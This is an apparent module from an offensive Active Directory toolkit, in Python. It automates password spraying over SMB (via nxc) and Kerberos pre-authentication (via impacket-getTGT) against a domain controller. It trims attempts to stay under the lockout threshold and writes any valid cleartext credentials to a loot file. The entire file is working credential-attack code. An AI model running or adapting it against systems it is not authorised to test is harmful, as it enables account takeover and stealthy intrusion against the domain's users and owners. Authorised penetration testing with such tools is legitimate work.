from __future__ import annotations

import asyncio
from pathlib import Path

from .. import runner, ui
from ..state import Findings, loot_dir


def _safe_attempts(password_policy: dict[str, str]) -> int:
    threshold = password_policy.get("lockout_threshold", "")
    for token in threshold.replace(",", " ").split():
        if token.isdigit():
            value = int(token)
            if value == 0:
                return 999
            return max(1, value - 2)
    return 3


async def _read_lines(path: Path) -> list[str]:
    seen: set[str] = set()
    out: list[str] = []
    for raw in path.read_text(errors="replace").splitlines():
        clean = raw.strip()
        if clean and not clean.startswith("#") and clean.lower() not in seen:
            seen.add(clean.lower())
            out.append(clean)
    return out


async def spray_smb(
    findings: Findings, *, users: list[str], passwords: list[str],
    continue_on_success: bool = True,
) -> list[tuple[str, str]]:
    if not runner.has("nxc"):
        ui.warn("nxc missing - cannot spray SMB.")
        return []
    if not findings.target.domain:
        ui.warn("spray needs --domain (Kerberos realm).")
        return []

    safe = _safe_attempts(findings.password_policy)
    if len(passwords) > safe:
        ui.warn(
            f"lockout threshold lets us safely try {safe} password(s). "
            f"You provided {len(passwords)}. Trimming to {safe}."
        )
        passwords = passwords[:safe]

    ui.section("password spray (SMB)")
    ui.explain(
        "Spray = same password across all users (avoids per-user lockout). "
        "We respect the discovered lockout_threshold to stay below the wire."
    )

    domain_dir = loot_dir(findings.target.ip)
    user_file = domain_dir / "_spray_users.txt"
    user_file.write_text("\n".join(users) + "\n")

    found: list[tuple[str, str]] = []
    for password in passwords:
        cmd = [
            runner.resolve("nxc") or "nxc", "smb", findings.target.ip,
            "-u", str(user_file), "-p", password,
            "-d", findings.target.domain,
            "--continue-on-success",
        ]
        ui.cmd(cmd[:6] + ["-d", findings.target.domain, "[...]"])
        result = await runner.run(cmd, timeout=300)
        new_creds: list[tuple[str, str]] = []
        for line in result.stdout.splitlines():
            if "[+]" in line and findings.target.domain.lower() in line.lower():
                parts = line.split()
                for token in parts:
                    if "\\" in token:
                        candidate = token.split("\\")[-1].rstrip(":")
                        if candidate and candidate not in (entry[0] for entry in found):
                            new_creds.append((candidate, password))
                            break
        for user, pw in new_creds:
            if (user, pw) not in found:
                found.append((user, pw))
                findings.cleartext_creds.append((user, pw))
                ui.crit(f"VALID: {user}:{pw}")
        if found and not continue_on_success:
            break

    if found:
        out = domain_dir / "spray_creds.txt"
        out.write_text("\n".join(f"{u}:{p}" for u, p in found) + "\n")
        ui.good(f"saved {len(found)} cred(s) -> {out}")
    else:
        ui.explain("no valid credentials found in spray.")
    return found


async def spray_kerberos(
    findings: Findings, *, users: list[str], passwords: list[str],
) -> list[tuple[str, str]]:
    """Kerberos pre-auth password spray via impacket-getTGT.

    Slightly louder than SMB (every attempt = AS-REQ with timestamp), but
    works even when SMB ports are blocked. Lockout still applies.
    """
    if not runner.has("getTGT") or not findings.target.domain:
        return []
    if 88 not in findings.target.open_ports:
        ui.explain("Kerberos (88) not open - skipping Kerberos spray.")
        return []

    safe = _safe_attempts(findings.password_policy)
    passwords = passwords[:safe]
    ui.section("password spray (Kerberos AS-REQ)")
    ui.explain(
        "Each attempt = full AS-REQ with PA-ENC-TIMESTAMP. KDC_ERR_PREAUTH_FAILED "
        "means wrong password (try next). Success means valid creds + TGT cached."
    )

    found: list[tuple[str, str]] = []
    sem = asyncio.Semaphore(10)

    async def attempt(user: str, password: str) -> None:
        async with sem:
            cmd = [
                runner.resolve("getTGT") or "impacket-getTGT",
                f"{findings.target.domain}/{user}:{password}",
                "-dc-ip", findings.target.ip,
            ]
            result = await runner.run(cmd, timeout=15)
            if result.ok and ".ccache" in result.combined:
                found.append((user, password))
                findings.cleartext_creds.append((user, password))
                ui.crit(f"VALID (Kerberos): {user}:{password}")

    tasks = [attempt(user, password) for password in passwords for user in users]
    await asyncio.gather(*tasks)
    return found


async def run_spray(
    findings: Findings, *, users_path: Path | None,
    passwords_path: Path | None, single_password: str | None,
) -> None:
    if not users_path and not findings.users:
        ui.warn("spray needs a userlist (--users) or stage 1 harvested users.")
        return

    if users_path:
        users = await _read_lines(users_path)
    else:
        users = sorted(findings.users)

    if single_password:
        passwords = [single_password]
    elif passwords_path:
        passwords = await _read_lines(passwords_path)
    else:
        from ..wordlists import COMMON_PASSWORDS
        passwords = COMMON_PASSWORDS

    if not passwords:
        ui.warn("no passwords to spray.")
        return

    await spray_smb(findings, users=users, passwords=passwords)
